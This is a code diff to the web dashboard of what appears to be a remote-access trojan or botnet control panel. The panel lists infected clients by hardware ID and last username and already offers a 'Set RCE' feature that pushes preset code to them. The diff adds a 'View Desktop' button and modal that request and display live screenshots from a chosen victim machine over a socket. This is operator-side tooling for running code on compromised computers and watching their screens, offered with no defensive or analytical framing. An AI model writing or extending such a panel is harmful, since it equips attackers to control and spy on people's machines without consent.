@@ -15,10 +15,12 @@
                                 <th scope="col">Last Pinged</th>
                                 <th scope="col">Last Username</th>
                                 <th scope="col">Set RCE</th>
+                                <th scope="col">View Desktop</th>
                             </tr>
                         </thead>
                         <tbody id="clientTableBody"></tbody>
                     </table>
+
                     <!-- RCE Modal -->
                     <div class="modal fade" id="rceModal" tabindex="-1" role="dialog" aria-labelledby="rceModalLabel" aria-hidden="true">
                         <div class="modal-dialog modal-lg" role="document">
@@ -37,6 +39,33 @@
                                 <div class="modal-footer">
                                     <button type="button" class="btn btn-secondary" data-dismiss="modal" id="rceClose">Close</button>
                                     <button type="button" class="btn btn-primary" id="rceSave">Save changes</button>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- View Desktop Modal -->
+                    <div
+                        class="modal fade"
+                        id="viewDesktopModal"
+                        tabindex="-1"
+                        role="dialog"
+                        aria-labelledby="viewDesktopModalLabel"
+                        aria-hidden="true"
+                    >
+                        <div class="modal-dialog-full-width modal-dialog modal-fluid" role="document">
+                            <div class="modal-content-full-width modal-content w-100">
+                                <div class="modal-header-full-width modal-header text-center">
+                                    <h5 class="modal-title w-100" id="viewDesktopModalLabel">View Desktop</h5>
+                                </div>
+                                <div class="modal-body w-100 d-flex justify-content-center" id="viewDesktopModalBody">
+                                    <div id="desktopSpinner" class="spinner-border text-secondary" role="status">
+                                        <span class="sr-only">Loading...</span>
+                                    </div>
+                                    <img id="desktopImg" style="max-width: 100%" />
+                                </div>
+                                <div class="modal-footer modal-footer-full-width">
+                                    <button type="button" class="btn btn-secondary" data-dismiss="modal" id="viewDesktopClose">Close</button>
                                 </div>
                             </div>
                         </div>
@@ -131,6 +160,11 @@
                         });
                 });
 
+                socket.on('receiveDesktop', (image) => {
+                    $('#desktopImg').attr('src', 'data:image/png;base64, ' + image);
+                    $('#desktopSpinner').hide();
+                });
+
                 socket.on('receiveClientLastName', (hwid, name) => {
                     $('#clientTableBody')
                         .children('tr')
@@ -151,6 +185,19 @@
                                                     .addClass('btn-sm')
                                                     .addClass('btn-secondary')
                                                     .addClass('set-rce-button')
+                                                    .attr('hwid', hwid)
+                                                    .text('Click Here')
+                                            )
+                                        );
+                                    $(this)
+                                        .parent('tr')
+                                        .append(
+                                            $('<td>').append(
+                                                $('<button>')
+                                                    .addClass('btn')
+                                                    .addClass('btn-sm')
+                                                    .addClass('btn-secondary')
+                                                    .addClass('view-desktop-button')
                                                     .attr('hwid', hwid)
                                                     .text('Click Here')
                                             )
@@ -178,6 +225,29 @@
                     $.get(`/api/get_preset_code/${snakeCase}`, function (data) {
                         if (data) editor.getSession().setValue(data);
                     });
+                });
+
+                $('body').delegate('#viewDesktopClose', 'click', function () {
+                    socket.emit('stopViewingDesktop', $(this).attr('hwid'));
+                });
+
+                $('body').delegate('.view-desktop-button', 'click', function () {
+                    const hwid = $(this).attr('hwid');
+                    const rceModalBody = $('#viewDesktopModalBody');
+
+                    if (!hwid || !rceModalBody) return;
+
+                    $('#viewDesktopModalLabel').text('View Desktop (' + hwid.slice(0, 20) + '...)');
+                    $('#desktopImg').attr('src', '');
+                    $('#desktopSpinner').show();
+                    $('#viewDesktopClose').attr('hwid', hwid);
+
+                    $('#viewDesktopModal').modal({
+                        keyboard: false,
+                        backdrop: 'static',
+                    });
+
+                    socket.emit('viewingDesktop', hwid);
                 });
 
                 $('body').delegate('.set-rce-button', 'click', function () {
